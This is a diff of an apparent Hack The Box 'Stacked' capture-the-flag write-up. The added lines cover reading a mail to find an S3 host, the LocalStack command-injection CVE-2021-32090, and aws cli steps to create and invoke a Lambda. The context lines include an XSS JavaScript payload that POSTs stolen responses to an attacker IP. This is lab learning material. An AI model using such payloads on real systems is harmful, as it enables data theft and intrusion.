@@ -91,8 +91,64 @@ var req2 = new XMLHttpRequest();
 req2.open('POST', "http://{attackerIP}:8000/", false)
 req2.send(response);
 ```
+- set target to "http://mail.stacked.htb/read-mail.php?id=1"
+- read the mail.
+- find new host "s3-testing.stacked.htb"
+- a s3 domain.
 
 
 ## LocalStack vulnerability
 
 #### CVE-2021-32090 
+- locatstack version v0.12.6
+- CVE search
+- CVE-2021-32090 
+- The dashboard component of StackLift LocalStack 0.12.6 allows attackers to inject arbitrary shell commands via the functionName parameter.
+
+#### configure aws
+```bash
+apt install awscli
+aws configure 
+aws [command] [subcommand] --endpoint-url http://s3-testing.stacked.htb
+```
+- as the config said "SERVICES=serverless"
+``` aws lambda list-functions --endpoint-url http://s3-testing.stacked.htb ```
+
+#### Create lambda(this box only has nodejs runtime)
+- <https://aws.amazon.com/lambda/>
+- <https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html>
+
+create random lambda function
+```javascript
+//example from official website
+exports.handler = async function(event, context){
+  console.log("Event: \n" + JSON.stringify(event, null ,2))
+  return context.logStreamName
+}
+```
+{: .nolineno file="index.js" }
+zip index.js
+``` zip index.zip index.js ```
+create this function at endpoint
+```bash
+aws lambda create-function \
+    --function-name 'a' \
+    --zip-file fileb://index.zip \
+    --handler index.handler \
+    --role localstackdonotmatter\
+    --runtime nodejs10.x
+```
+invoke the function
+```bash
+aws lambda --endpoint=http://s3-testing.stacked.htb \
+  invoke --function-name a output
+```
+check if it run properly
+``` cat output ```
+
+PS: if use python script, set "Runtime": "python3.7", but this machine does not have python runtime, so there would be an error.
+
+####  
+
+
+
